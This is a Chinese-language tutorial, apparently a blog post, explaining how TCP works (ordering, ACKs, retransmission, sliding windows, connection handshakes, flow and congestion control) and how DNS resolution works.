<p>IP 协议和 UDP 协议采用的是数据包的方式传送，后发出的数据包可能早到，我们并不能保证数据到达的次序。TCP 协议确保了数据到达的顺序与文本流顺序相符。当计算机从 TCP 协议的接口读取数据时，这些数据已经是排列好顺序的“流”了。比如我们有一个大文件要从本地主机发送到远程主机，如果是按照“流”接收到的话，我们可以一边接收，一边将文本流存入文件系统。这样，等到“流”接收完了，硬盘写入操作也已经完成。如果采取 UDP 的传输方式，我们需要等到所有的数据到达后，进行排序，才能组装成大的文件。这种情况下，我们不得不使用大量的计算机资源来存储已经到达的数据，直到所有数据都达到了，才能开始处理。</p>
<p>“流”的要点是次序(order)，然而实现这一点并不简单。TCP 协议是基于 IP 协议的，所以最终数据传送还是以 IP 数据包为单位进行的。如果一个文本流很长的话，我们不可能将整个文本流放入到一个 IP 数据包中，那样有可能会超过 MTU。所以，TCP 协议封装到 IP 包的不是整个文本流，而是 TCP 协议所规定的片段(segment)。与之前的一个 IP 或者 UDP 数据包类似，一个 TCP 片段同样分为头部(header)和数据(payload)两部分 (“片段”这个名字更多是起提醒作用：嘿，这里并不是完整的文本流)。整个文本流按照次序被分成小段，而每一段被放入 TCP 片段的数据部分。一个 TCP 片段封装成的 IP 包不超过整个 IP 接力路径上的最小 MTU，从而避免令人痛苦的碎片化(fragmentation)。</p>
<p>(给文本流分段是在发送主机完成的，而碎片化是在网络中的路由器完成的。路由器要处理许多路的通信，所以相当繁忙。文本流提前在发送主机分好段，可以避免在路由器上执行碎片化，可大大减小网络负担)</p>
<p>TCP 片段的头部(header)会存有该片段的序号(sequence number)。这样，接收的计算机就可以知道接收到的片段在原文本流中的顺序了，也可以知道自己下一步需要接收哪个片段以形成流。比如已经接收到了片段1，片段2，片段3，那么接收主机就开始期待片段4。如果接收到不符合顺序的数据包(比如片段8)，接收方的TCP模块可以拒绝接收，从而保证呈现给接收主机的信息是符合次序的“流”。</p>
<p><strong>可靠性</strong></p>
<p>片段编号这个初步的想法并不能解决我们所有的问题。IP 协议是不可靠的，所以 IP 数据包可能在传输过程中发生错误或者丢失。而IP传输是”Best Effort” 式的，如果发生异常情况，我们的IP数据包就会被轻易的丢弃掉。另一方面，如果乱序(out-of-order)片段到达，根据我们上面说的，接收主机不会接收。这样，错误片段、丢失片段和被拒片段的联手破坏之下，接收主机只可能收到一个充满“漏洞”的文本流。</p>
<p>TCP 的补救方法是，在每收到一个正确的、符合次序的片段之后，就向发送方(也就是连接的另一段)发送一个特殊的 TCP 片段，用来知会(ACK，acknowledge)发送方：我已经收到那个片段了。这个特殊的 TCP 片段叫做 ACK 回复。如果一个片段序号为 L，对应 ACK 回复有回复号 L+1，也就是接收方期待接收的下一个发送片段的序号。如果发送方在一定时间等待之后，还是没有收到 ACK 回复，那么它推断之前发送的片段一定发生了异常。发送方会重复发送(retransmit)那个出现异常的片段，等待 ACK 回复，如果还没有收到，那么再重复发送原片段… 直到收到该片段对应的 ACK 回复(回复号为L+1的ACK)。</p>
<p>当发送方收到 ACK 回复时，它看到里面的回复号为 L+1，也就是发送方下一个应该发送的 TCP 片段序号。发送方推断出之前的片段已经被正确的接收，随后发出 L+1 号片段。ACK 回复也有可能丢失。对于发送方来说，这和接收方拒绝发送 ACK 回复是一样的。发送方会重复发送，而接收方接收到已知会过的片段，推断出 ACK 回复丢失，会重新发送 ACK 回复。</p>
<p>通过ACK回复和重新发送机制，TCP 协议将片段传输变得可靠。尽管底盘是不可靠的 IP 协议，但 TCP 协议以一种“不放弃的精神”，不断尝试，最终成功。(技术也可以很励志)</p>
<p>TCP 协议和 UDP 协议走了两个极端。TCP 协议复杂但可靠，UDP 协议轻便但不可靠。在处理异常的时候，TCP 极端负责，而 UDP 一副无所谓的样子。</p>
<h3 id="u6ED1_u7A97"><a href="#u6ED1_u7A97" class="headerlink" title="滑窗"></a>滑窗</h3><p>上面的工作方式中，发送方保持发送-&gt;等待ACK-&gt;发送-&gt;等待ACK…的单线工作方式，这样的工作方式叫做 stop-and-wait。stop-and-wait 虽然实现了 TCP 通信的可靠性，但同时牺牲了网络通信的效率。在等待 ACK 的时间段内，我们的网络都处于闲置(idle)状态。我们希望有一种方式，可以同时发送出多个片段。然而如果同时发出多个片段，那么由于 IP 包传送是无次序的，有可能会生成乱序片段(out-of-order)，也就是后发出的片段先到达。在 stop-and-wait 的工作方式下，乱序片段完全被拒绝，这也很不效率。毕竟，乱序片段只是提前到达的片段。我们可以在缓存中先存放它，等到它之前的片段补充完毕，再将它缀在后面。然而，如果一个乱序片段实在是太过提前(太“乱”了)，该片段将长时间占用缓存。我们需要一种折中的方法来解决该问题：利用缓存保留一些“不那么乱”的片段，期望能在段时间内补充上之前的片段(暂不处理，但发送相应的 ACK)；对于“乱”的比较厉害的片段，则将它们拒绝(不处理，也不发送对应的 ACK)。</p>
<p>滑窗(sliding window)被同时应用于接收方和发送方，以解决以上问题。发送方和接收方各有一个滑窗。当片段位于滑窗中时，表示TCP正在处理该片段。滑窗中可以有多个片段，也就是可以同时处理多个片段。滑窗越大，越大的滑窗同时处理的片段数目越多(当然，计算机也必须分配出更多的缓存供滑窗使用)。TCP协议有实时调整滑窗大小的算法，以实现最优效率。</p>
<p>TCP协议和UDP协议走了两个极端。TCP协议复杂但可靠，UDP协议轻便但不可靠。在处理异常的时候，TCP极端负责，而UDP一副无所谓的样子。在TCP中，分段和编号实现了次序；ACK和重新发送实现了可靠性；sliding window则让上面的机制更加有效率的运行。Never give up，这就是TCP协议的态度。</p>
<h3 id="TCP_u8FDE_u63A5"><a href="#TCP_u8FDE_u63A5" class="headerlink" title="TCP连接"></a>TCP连接</h3><p>在 TCP 协议与”流”通信中，我们概念性的讲解了 TCP 通信的方式。可以看到，TCP 通信最重要的特征是：有序(ordering)和可靠(reliable)。有序是通过将文本流分段并编号实现的。可靠是通过 ACK 回复和重复发送(retransmission)实现的。这一篇文章将引入 TCP 连接(connection)的概念。</p>
<p>网络层在逻辑上提供了端口的概念。一个 I P地址可以有多个端口。一个具体的端口需要 IP 地址和端口号共同确定(我们记为 IP:port 的形式)。一个连接为两个 IP:port 之间建立 TCP 通信。</p>
<p>参与连接的如果是两台电脑，那么两台电脑操作系统的 TCP 模块负责建立连接。每个连接有四个参数(两个 IP，两个端口)，来表明“谁在和谁通话”。每台电脑都会记录有这四个参数，以确定是哪一个连接。如果这四个参数完全相同，则为同一连接；如果这四个参数有一个不同，即为不同的连接。这意味着，同一个端口上可以有多个连接。内核中的TCP模块生成连接之后，将连接分配给进程使用。</p>
<p>TCP 连接是双向(duplex)的。在 TCP 协议与”流”通信中，我们所展示的 TCP 传输是单向的。双向连接实际上就是建立两个方向的 TCP 传输，所以概念上并不复杂。这时，连接的每一方都需要两个滑窗，以分别处理发送的文本流和接收的文本流。由于连接的双向性，我们也要为两个方向的文本流编号。这两个文本流的编号相互独立。为文本流分段和编号由发送方来处理，回复 ACK 则由接收的一方进行。</p>
<p><strong>TCP片段的头部格式</strong></p>
<p>在深入 TCP 连接之前，我们需要对 TCP 片段的头部格式有一些了解。我们知道，TCP 片段分为头部和数据。数据部分为 TCP 真正传输的文本流数据。下面为 TCP 片段的头部格式：</p>
<p><img src="/images/14551394884094.jpg" alt=""></p>
<p>先关注下面几点：</p>
<ol>
<li>一个 TCP 头部需要包含出发端口(source port)和目的地端口(destination port)。这些与 IP 头中的两个 IP 地址共同确定了连接。</li>
<li>每个 TCP 片段都有序号(sequence number)。这些序号最终将数据部分的文本片段整理成为文本流。</li>
<li>ACK 是一位(bit)。只有 ACK 位设定的时候，回复号(Acknowledgement number)才有效。ACK 回复号说明了接收方期待接收的下一个片段，所以 ACK 回复号为最后接收到的片段序号加 1。<ul>
<li>很多时候，ACK 回复“附着”在发送的数据片段中。TCP 协议是双向的。比如 A 和 B 两个电脑。 ACK 回复是接收方回复给发送方 (比如 A 发送给 B， B 回复 A)。但同时，B 也可以是发送方，B 有可能有数据发送给 A，所以 B 就把 ACK 回复附着在它要发送给 A 的数据片段的头部。这样可以减少 ACK 所占用的交通流量。一个片段可以只包含 ACK 回复。一个纯粹的 ACK 回复片段不传送文本流，所以不消耗序列号。如果有下一个正常的数据片段，它的序号将与纯粹 ACK 回复片段的序号相同。</li>
<li>(ACK 回复还可以“附着”在 SYN 片段和 FIN 片段)</li>
</ul>
</li>
<li>ACK 后面还有 SYN 和 FIN，它们也各占据一位(bit)。我将在后面说明这两位。</li>
</ol>
<p><strong>连接的建立</strong></p>
<p>在 TCP 协议与”流”通信中讨论的 TCP 传输需要一个前提：TCP 连接已经建立。然而，TCP 连接从无到有需要一个建立连接的过程。建立连接的最重要目是让连接的双方交换初始序号(ISN, Initial Sequence Number)。根据 TCP 协议的规定，文本流的第一个片段的序号不能是确定的数字(比如说1)。连接的双方各自随机生成自己的 ISN，然后再利用的一定方式让对方了解。这样的规定是出于 TCP 连接安全考虑：如果以一个确定的数字作为初始的 TCP 序号，那么其他人很容易猜出接下来的序列号，并按照正确的序号发送“伪装”的 TCP 片段，以插入到文本流中。</p>
<p>ISN 交换是通过 SYN 片段实现的。SYN 片段由头部的 SYN 位表明，它的序号为发送方的 ISN。该片段由连接的一方首先发给给另一方，我们将发送 SYN 的一方称为客户(client)，而接收 SYN 的一方称为服务器(server)。我们使用 ISN(c) 表示 client 一方的 ISN，使用 ISN(s) 表示 server 一方的 ISN。随后，接收到 SYN 的 server 需要回复 ACK，并发送出包含有 server 的 ISN 的 SYN 片段。下图为建立连接的过程，也就是经典的 TCP 三次握手(three-way handshaking)。两条竖直线分别为 client 和 server 的时间轴。每个箭头代表了一次 TCP 片段的单向传输。</p>
<p><img src="/images/14551395013280.jpg" alt=""></p>
<p><strong>连接的正常终结</strong></p>
<p>一个连接建立之后，连接两端的进程可以利用该连接进行通信。当连接的一方觉得“我讲完了”，它可以终结连接中发送到对方方向的通信。连接最终通过四次握手(four-way handshaking)的方式终结，连接终结使用的是特殊片段 FIN(FIN位为1的片段)。</p>
<p><img src="/images/14551395178688.jpg" alt=""></p>
<p>我们可以看到，连接终结的过程中，连接双方也交换了四片信息(两个 FIN 和两个 ACK)。在终结连接的过程中，TCP 并没有合并 FIN 与 ACK 片段。原因是 TCP 连接允许单向关闭(half-close)。也就是说，TCP 连接关闭了一个方向的传输，成为一个单向连接(half-duplex)。第二个箭头和第三个箭头传递必须分开，才能有空隙在开放的方向上继续传输。如果第二个箭头和第三个箭头合并在一起，那么，随着一方关闭，另一方也要被迫关闭。</p>
<p>第二和第三次握手之间，server 可以继续单向的发送片段给 client，但 client 不能发送数据片段给 server。</p>
<p>(上面的终结从 client 先发起，TCP 连接终结也可以从 server 先发起。)</p>
<p>在 Client 发送出最后的 ACK 回复，但该 ACK 可能丢失。Server 如果没有收到 ACK，将不断重复发送 FIN 片段。所以 Client 不能立即关闭，它必须确认 Server 接收到了该 ACK。Client 会在发送出 ACK 之后进入到 <code>TIME_WAIT</code> 状态。Client 会设置一个计时器，等待 2MSL 的时间。如果在该时间内再次收到 FIN，那么 Client 会重发 ACK 并再次等待 2MSL。所谓的 2MSL 是两倍的 MSL(Maximum Segment Lifetime)。MSL 指一个片段在网络中最大的存活时间，2MSL 就是一个发送和一个回复所需的最大时间。如果直到 2MSL，Client 都没有再次收到 FIN，那么 Client 推断 ACK 已经被成功接收，则结束 TCP 连接。</p>
<p>TCP 是连接导向的协议，与之对应的是像 UDP 这样的非连接导向的协议。连接能带来更好的传输控制，但也需要更多额外的工作，比如连接的建立和终结。</p>
<p>我们还初步了解了 TCP 的头部格式。应该注意到，许多时候我们将 ACK 片段“附着”在其他片段上。相对于纯粹的 ACK 片段，我们这样做节约了 ACK 所需的流量。事实上，由于 ACK 片段所需的 ACK 位和 acknowledge number 区域总是存在于 TCP 的头部，所以附着 ACK 片段的成本基本上等于 0。</p>
<h3 id="TCP_u6ED1_u7A97_u7BA1_u7406"><a href="#TCP_u6ED1_u7A97_u7BA1_u7406" class="headerlink" title="TCP滑窗管理"></a>TCP滑窗管理</h3><p>在 TCP 协议与”流”通信中，我们建立了滑窗(sliding window)的基本概念。通过滑窗与 ACK 的配合，我们一方面实现了 TCP 传输的可靠性，另一方面也一定程度上提高了效率。</p>
<p>然而，之前的解释只是概念性的。TCP 为了达到更好的传输效率，对上面的工作方式进行了许多改进。The devil is in the details. 我们需要深入到细节，才能看清楚TCP协议的智慧所在。</p>
<p><strong>累计ACK</strong></p>
<p>在 TCP 连接中，我们通过将 ACK 回复“附着”在其他数据片段的方式，减少了 ACK 回复所消耗的流量。但这并不是全部的故事。TCP 协议并不是对每个片段都发送 ACK 回复。TCP 协议实际采用的是累计 ACK 回复(accumulative acknowledgement)。接收方往往利用一个 ACK 回复来知会连续多个片段的成功接收。通过累计 ACK，所需要的 ACK 回复通常可以降到 50%。</p>
<p>如下图所示，橙色为已经接收的片段。方框为滑窗，滑窗可容纳 3 个片段。</p>
<p><img src="/images/14551395342559.jpg" alt=""></p>
<p>滑窗还没接收到片段7时，已接收到片段8，9。这样就在滑窗中制造了一个“空穴”(hole)。当滑窗最终接收到片段7时，滑窗送出一个回复号为10的ACK回复。发送方收到该回复，会意识到，片段10之前的片段已经按照次序被成功接收。整个过程中节约了片段7和片段8所需的两个ACK回复。</p>
<p>此外，接收方在接收到片断，并应该回复ACK的时候，会故意延迟一些时间。如果在延迟的时间里，有后续的片段到达，就可以利用累计ACK来一起回复了。</p>
<p><strong>滑窗结构</strong></p>
<p>在之前的讨论中，我们以片段为单位，来衡量滑窗的大小的。真实的滑窗是以 byte 为单位表示大小，但这并不会对我们之前的讨论造成太大的影响。</p>
<p><img src="/images/14551395682155.jpg" alt=""></p>
<p>发送方滑窗可以分为下面两个部分。offered window 为整个滑窗的大小。</p>
<p><img src="/images/14551395777596.jpg" alt=""></p>
<p>可以看到，接收方的滑窗相对于发送方的滑窗多了一个”Received; ACKed; Not Sent to Proc”的部分。接收方接收到的文本流必须等待进程来读取。如果进程正忙于做别的事情，那么这些文本流即使已经正确接收，还是需要暂时占用接收缓存。当出现上述占用时，滑窗的可用部分(也就是图中advertised window)就会缩水。这意味着接收方的处理能力下降。如果这个时候发送方依然按照之前的速率发送数据给接收方，接收方将无力接收这些数据。</p>
<h3 id="u6D41_u91CF_u63A7_u5236"><a href="#u6D41_u91CF_u63A7_u5236" class="headerlink" title="流量控制"></a>流量控制</h3><p>TCP协议会根据情况自动改变滑窗大小，以实现流量控制。流量控制(flow control)是指接收方将advertised window的大小通知给发送方，从而指导发送方修改 offered window 的大小。接收方将该信息放在 TCP 头部的 window size 区域：</p>
<p><img src="/images/14551395892901.jpg" alt=""></p>
<p>发送方在收到 window size 的通知时，会调整自己滑窗的大小，让 offered window 和advertised window 相符。这样，发送窗口变小，文本流发送速率降低，从而减少了接收方的负担。</p>
<p><strong>零窗口</strong></p>
<p>advertised window 大小有可能变为0，这意味着接收方的接收能力降为0。发送方收到大小为0的advertised window 通知时，停止发送。</p>
<p>当接收方经过处理，再次产生可用的 advertised window 时，接收方会通过纯粹的 ACK 回复来通知发送方，让发送方恢复发送。然而，ACK 回复的传送并不是可靠的。如果该 ACK 回复丢失，那么 TCP 传输将陷入死锁(deadlock)状态。</p>
<p>为此，发送方会在零窗口后，不断探测接收方的窗口。窗口探测(window probe)时，发送方会向接收方发送包含 1 byte 文本流的 TCP 片段，并等待 ACK 回复(该 ACK 回复包含有 window size)。由于有 1 byte 的数据存在，所以该传输是可靠的，而不用担心 ACK 回复丢失的问题。如果探测结果显示窗口依然为 0，发送方会等待更长的时间，然后再次进行窗口探测，直到 TCP 传输恢复。</p>
<p><strong>白痴窗口综合症</strong></p>
<p>滑窗机制有可能犯病，比如白痴窗口综合症 (Silly Window Syndrome)。假设这样一种情形：接收方宣布(advertise)一个小的窗口，发送方根据advertised window，发送一个小的片段。接收方的小窗口被填满，经过处理，接收方再宣布一个小的窗口…… 这就是“白痴窗口综合症”：TCP通信的片段中包含的数据量很小。在这样的情况下，TCP 通信的片段所含的信息都很小，网络流量主要是 TCP 片段的头部，从而造成流量的浪费 (由于 TCP 头部很大，我们希望每个 TCP 片段中含有比较多的数据)。</p>
<p>如果发送方不断发送小的片段，也会造成“白痴窗口”。为了解决这个问题，需要从两方面入手。TCP中有相关的规定，要求：</p>
<ol>
<li>接收方宣告的窗口必须达到一定的尺寸，否则等待。</li>
<li>除了一些特殊情况，发送方发送的片段必须达到一定的尺寸，否则等待。特殊情况主要是指需要最小化延迟的 TCP 应用(比如命令行互动)。</li>
</ol>
<p>累计 ACK 减少了 TCP 传输过程中所需的 ACK 流量。通过流量管理，TCP 连接两端的工作能力可以匹配，从而减少不不要的传输浪费。累计 ACK 和流量控制都是 TCP 协议的重要特征。</p>
<p>TCP 协议相当复杂，并充斥着各种细节。然而 TCP 协议又是如此重要的一个协议，引领风骚三十年，可以说是互联网的奇迹。这些细节正是 TCP 协议成功的原因，并值得我们深入了解。</p>
<h3 id="TCP_u91CD_u65B0_u53D1_u9001"><a href="#TCP_u91CD_u65B0_u53D1_u9001" class="headerlink" title="TCP重新发送"></a>TCP重新发送</h3><p>TCP 协议是一个可靠的协议。它通过重新发送(retransmission)来实现 TCP 片段传输的可靠性。简单的说，TCP 会不断重复发送 TCP 片段，直到片段被正确接收。</p>
<p><strong>TCP片段丢失</strong></p>
<p><img src="/images/14551396019064.jpg" alt=""></p>
<p>接收方(receiver)可以通过校验 TCP 片段头部中 checksum 区域来检验 TCP 片段是否出错。我们已经接触过了 IP 协议详解的 checksum 算法。TCP 片段的 checksum 算法与之类似。IP 协议的 checksum 只校验头部，TCP 片段头部的 checksum 会校验包括 IP 头部、TCP 头部和 TCP 数据在内的整个序列，确保 IP 地址、端口号和其他相关信息正确。如果 TCP 片段出错，接收方可以简单的丢弃改 TCP 片段，也就相当于 TCP 片段丢失。</p>
<p>TCP 片段包裹在一个 IP 包中传输。IP 包可能在网络中丢失。导致 IP 包丢失的原因可能有很多，比如 IP 包经过太多的路由器接力，达到 hop limit；比如路由器太过拥挤，导致一些 IP 包被丢弃；再比如路由表(routing table)没有及时更新，导致 IP 包无法送达目的地。</p>
<p>下面我们要介绍两种重新发送 TCP 片段的机制：超时重新发送和快速重新发送。 </p>
<p><strong>超时重新发送</strong></p>
<p>我们之前已经简单介绍过重新发送的机制：当发送方送出一个 TCP 片段后，将开始计时，等待该 TCP 片段的 ACK 回复。如果接收方正确接收到符合次序的片段，接收方会利用 ACK 片段回复发送方。发送方得到 ACK 回复后，继续移动窗口，发送接下来的 TCP 片段。如果直到计时完成，发送方还是没有收到 ACK 回复，那么发送方推断之前发送的 TCP 片段丢失，因此重新发送之前的 TCP 片段。这个计时等待的时间叫做重新发送超时时间(RTO, retransmission timeout)。</p>
<p>发送方应该在等待多长时间之后重新发送呢？这是重新发送的核心问题。上述过程实际上有往返两个方向：</p>
<ol>
<li>发送片段从发送方到接收方的传输，</li>
<li>ACK 片段从接收方到发送方的传输</li>
</ol>
<p>整个过程实际耗费的时间称做往返时间(RTT, round trip time)。如果 RTT 是固定的，比如1秒，那么我们可以让 RTO 等于 RTT。但实际上，RTT 的上下浮动很大。比如某个时刻，网络中有许多交通，那么 RTT 就增加。在 RTT 浮动的情况下，如果我们设置了过小的 RTO，那么 TCP 会等待很短的时间之后重新发送，而实际上之前发送的片段并没有丢失，只是传输速度比较慢而已，这样，网络中就被重复注入 TCP 片段，从而浪费网络传输资源。另一方面，如果 RTO 时间过长，那么当 TCP 片段已经实际丢失的情况下，发送方不能及时重新发送，会造成网络资源的闲置。所以，RTO 必须符合当前网络的使用状况。网络状况越好，RTO 应该越短；网络状况越差，RTO 应该越长。</p>
<p>TCP 协议通过统计 RTT，来决定合理的 RTO。发送方可以测量每一次 TCP 传输的 RTT (从发送出数据片段开始，到接收到 ACK 片段为止)，这样的每次测量得到的往返时间，叫做采样 RTT(srtt, sampling round trip time)。建立连接之后，每次的 srtt 作为采样样本，计算平均值(mean)和标准差(standard deviation)，并让 RTO 等于 srtt 平均值加上四倍的 srtt 标准差。</p>
<p>RTO = mean + 4 std</p>
<p>(上述算法有多个变种，根据平台不同有所变化)</p>
<p>平均值反映了平均意义上的 RTT，平均往返时间越大，RTO 越大。另一方面，标准差越大也会影响 RTO。标准差代表了 RTT 样本的离散程度。如果 RTT 上下剧烈浮动，标准差比较大。RTT 浮动大，说明当前网络状况相对不稳定。因此要设置更长的 RTO，以应对不稳定的网络状况。</p>
<p><strong>快速重新发送</strong></p>
<p>我们刚才介绍了超时重新发送的机制：发送方送出一个 TCP 片段，然后开始等待并计时，如果 RTO 时间之后还没有收到 AC K回复，发送方则重新发送。TCP 协议有可能在计时完成之前启动重新发送，也就是利用快速重新发送(fast-retransmission)。快速发送机制如果被启动，将打断计时器的等待，直接重新发送 TCP 片段。</p>
<p>由于IP包的传输是无序的，所以接收方有可能先收到后发出的片段，也就是乱序(out-of-order)片段。乱序片段的序号并不等于最近发出的ACK回复号。已接收的文本流和乱序片段之间将出现空洞(hole)，也就是等待接收的空位。比如已经接收了正常片段5,6,7，此时又接收乱序片段9。这时片段8依然空缺，片段8的位置就是一个空洞。</p>
<p>TCP 协议规定，当接收方收到乱序片段的时候，需要重复发送 ACK。比如接收到乱序片段 9 的时候，接收方需要回复 ACK。回复号为 8 (7+1)。此后接收方如果继续收到乱序片段(序号不是8的片段)，将再次重复发送 ACK=8。当发送方收到 3 个 ACK=8 的回复时，发送方推断片段 8 丢失。即使此时片段 8 的计时器还没有超时，发送方会打断计时，直接重新发送片段 8，这就是快速重新发送机制(fast-retransmission)。</p>
<p>快速重新发送机制利用重复的 ACK 来提示空洞的存在。当重复次数达到阈值时，认为空洞对应的片段在网络中丢失。快速重新发送机制提高了检测丢失片段的效率，往往可以在超时之前探测到丢失片段，并重复发送丢失的片段。</p>
<h3 id="TCP_u5835_u585E_u63A7_u5236"><a href="#TCP_u5835_u585E_u63A7_u5236" class="headerlink" title="TCP堵塞控制"></a>TCP堵塞控制</h3><p>在 TCP 协议中，我们使用连接记录 TCP 两端的状态，使用编号和分段实现了 TCP 传输的有序，使用 advertised window 来实现了发送方和接收方处理能力的匹配，并使用重复发送来实现 TCP 传输的可靠性。我们只需要将 TCP 片段包装成 IP 包，扔到网络中就可以了。TCP 协议的相关模块会帮我们处理各种可能出现的问题(比如排序，比如TCP片段丢失等等)。最初的 TCP 协议就是由上述的几大块构成的。</p>
<p>然而进入上世纪八十年代，网络开始变的繁忙。许多网络中出现了大量的堵塞(congestion)。堵塞类似于现实中的堵车。网络被称为“信息高速公路”。许多汽车(IP包)在网络中行驶，并经过一个一个路口 (路由器)，直到到达目的地。一个路由器如果过度繁忙，会丢弃一些 IP 包。UDP 协议不保证传输的可靠性，所以丢失就丢失了。而 TCP 协议需要保证传输的可靠性，当包含有 TCP 片段的 IP 包丢失时，TCP 协议会重复发送 TCP 片段。于是，更多的“汽车”进入到公路中，原本繁忙的路由器变得更加繁忙，更多的IP包丢失。这样就构成了一个恶性循环。这样的情况被称为堵塞崩溃(congestion collapse)。每个发送方为了保证自己的发送质量，而不顾及公共领域现状，是造成堵塞崩溃的主要原因。当时的网络中高达90%的传输资源可能被堵塞崩溃所浪费。</p>
<p>为了解决这一缺陷，从八十年代开始，TCP 协议中开始加入堵塞控制(congestion control)的功能，以避免堵塞崩溃的出现。多个算法被提出并实施，大大改善了网络的交通状况。直到今天，堵塞控制依然是互联网研究的一个活跃领域。</p>
<p>现实中，当我们遇到堵车，可能就会希望兴建立交桥和高架，或者希望有一位交警来疏导交通。而 TCP 协议的堵塞控制是通过约束自己实现的。当 TCP 的发送方探测到网络交通拥堵时，会控制自己发送片段的速率，以缓解网络的交通状况，避免堵塞崩溃。简言之，TCP 协议规定了发送方需要遵守的“公德”。</p>
<p>我们先来说明堵塞是如何探测的。在 TCP 重新发送中，我们已经总结了两种推测 TCP 片段丢失的方法：ACK 超时和重复 ACK。一旦发送方认为 TCP 片段丢失，则认为网络中出现堵塞。</p>
<p>另一方面，TCP 发送方是如何控制发送速率呢？TCP 协议通过控制滑窗(sliding window)大小来控制发送速率。在 TCP 滑窗管理中，我们已经见到了一个窗口限制，就是advertised window size，以实现 TCP 流量控制。TCP 还会维护一个congestion window size，以根据网络状况来调整滑窗大小。真实滑窗大小取这两个滑窗限制的最小值，从而同时满足两个限制 (流量控制和堵塞控制)</p>
<p><strong>Congestion Window</strong></p>
<p>congestion window 总是处于两种状态的一个。这两种状态是: 慢起动(slow start)和堵塞避免(congestion avoidance)。</p>
<p><img src="/images/14551396186893.jpg" alt=""></p>
<p>上图是概念性的。实际的实施要比上图复杂，而且根据算法不同会有不同的版本。cwnd 代表congestion window size。我们以片段的个数为单位，来表示 cwnd 的大小 (同样是概念性的)。</p>
<p>Congestion window 从 slow start的状态开始。Slow start 的特点是初始速率低，但速率不断倍增。每次进入到 slow start 状态时，cwnd 都需要重置为初始值 1。发送方每接收到一个正确的 ACK，就会将 congestion window 增加 1，从而实现速率的倍增(由于累计 ACK，速率增长可能会小于倍增)。</p>
<p>当 congestion window 的大小达到某个阈值 ssthresh 时，congestion 进入到 congestion avoidance 状态。发送速率会继续增长。发送方在每个窗户所有片段成功传输后，将窗口尺寸增加 1(实际上就是每个 RTT 增加 1)。所以在 congestion avoidance 下，cwnd 线性增长，增长速率慢。</p>
<p>如果在 congestion avoidance 下有片段丢失，重新回到 slow start 状态，并将 ssthresh 更新为 cwnd 的一半。</p>
<p>我们看到，sshthresh 是 slow start 到 congestion avoidance 的切换点。而片段丢失是 congestion avoidance 到 slow start 的切换点。一开始 sshthresh 的值一般比较大，所以 slow start 可能在切换成 congestion avoidance 之前就丢失片段。这种情况下，slow start 会重新开始，而 ssthresh 更新为 cwnd 的一半。</p>
<p>总的来说，发送速率总是在增长。如果片段丢失，则重置速率为1，并快速增长。增长到一定程度，则进入到慢性增长。快速增长和慢性增长的切换点(sshthred)会随着网络状况(何时出现片段丢失)更新。通过上面的机制，让发送速率处于动态平衡，不断的尝试更大值。初始时增长块，而接近饱和时增长慢。但一旦尝试过度，则迅速重置，以免造成网络负担。</p>
<p>阻塞控制有效的提高了互联网的利用率。阻塞控制的算法多种多样，并且依然不完善。一个常见的问题是cwnd在接近饱和时线性增长，因此对新增的网络带宽不敏感。</p>
<p>互联网利用“公德”来实现效率。“公德”和效率似乎可以并存。</p>
<p>到现在为止，TCP协议的介绍就可以告一段落了。可以回想一下TCP的几大模块：分段与流，滑窗，连接，流量控制，重新发送，堵塞控制。</p>
<h2 id="u5E94_u7528_u5C42_u534F_u8BAE"><a href="#u5E94_u7528_u5C42_u534F_u8BAE" class="headerlink" title="应用层协议"></a>应用层协议</h2><h3 id="DNS_u534F_u8BAE"><a href="#DNS_u534F_u8BAE" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>域名(domain name)是IP地址的代号。域名通常是由字符构成的。对于人类来说，字符构成的域名，比如 www.yahoo.com，要比纯粹数字构成的IP地址(106.10.170.118)容易记忆。域名解析系统(DNS, domain name system)就负责将域名翻译为对应的IP地址。在 DNS 的帮助下，我们可以在浏览器的地址栏输入域名，而不是IP地址。这大大减轻了互联网用户的记忆负担。另一方面，处于维护和运营的原因，一些网站可能会变更 IP 地址。这些网站可以更改 DNS 中的对应关系，从而保持域名不变，而 IP 地址更新。由于大部分用户记录的都是域名，这样就可以降低 IP 变更带来的影响。</p>
<p>从机器和技术的角度上来说，域名并不是必须的。但 Internet 是由机器和用户共同构成的。鉴于 DNS 对用户的巨大帮助，DNS 已经被当作 TCP/IP 套装不可或缺的一个组成部分。</p>
<p>域名和 IP 地址的对应关系存储在 DNS 服务器(DNS server)中。所谓的 DNS 服务器，是指在网络中进行域名解析的一些服务器(计算机)。这些服务器都有自己的 IP 地址，并使用 DNS 协议(DNS protocol)进行通信。DNS 协议主要基于 UDP，是应用层协议。</p>
<p><img src="/images/14551396313267.jpg" alt=""></p>
<p>DNS 服务器构成一个分级(hierarchical)的树状体系。上图中，每个节点(node)为一个 DNS 服务器，每个节点都有自己的 IP 地址。树的顶端为用户电脑出口处的 DNS 服务器。在 Linux 下，可以使用 <code>cat /etc/resolv.conf</code>，在 Windows 下，可以使用 <code>ipconfig /all</code>，来查询出口 DNS 服务器。树的末端是真正的域名/IP对应关系记录。一次 DNS 查询就是从树的顶端节点出发，最终找到相应末端记录的过程。</p>
<p>中间节点根据域名的构成，将 DNS 查询引导向下一级的服务器。比如说一个域名 cs.berkeley.edu，DNS解析会将域名分割为 cs, berkeley, edu，然后按照相反的顺序查询(edu, berkeley, cs)。出口 DNS 首先根据 edu，将查询指向下一层的 edu 节点。然后 edu 节点根据 berkeley，将查询指向下一层的 berkeley 节点。这台 berkeley 服务器上存储有 cs.berkeley.edu 的 IP 地址。所以，中间节点不断重新定向，并将我们引导到正确的记录。</p>
<p>在整个 DNS 查询过程中，无论是重新定向还是最终取得对应关系，都是用户计算机和 DNS 服务器使用 DNS 协议通信。用户计算机根据 DNS 服务器的反馈，依次与下一层的 DNS 服务器建立通信。用户计算机经过递归查询，最终和末端节点通信，并获得IP地址。</p>
<p><img src="/images/14551396446583.jpg" alt=""></p>
<p>用户计算机的操作系统中的域名解析模块(DNS Resolver)负责域名解析的相关工作。任何一个应用程序(邮件，浏览器)都可以通过调用该模块来进行域名解析。</p>
<p>并不是每次域名解析都要完整的经历解析过程。DNS Resolver 通常有 DNS 缓存(cache)，用来记录最近使用和查询的域名/IP关系。在进行 DNS 查询之前，计算机会先查询 cache 中是否有相关记录。这样，重复使用的域名就不用总要经过整个递归查询过程。</p>
<p><img src="/images/14551396560030.jpg" alt=""></p>
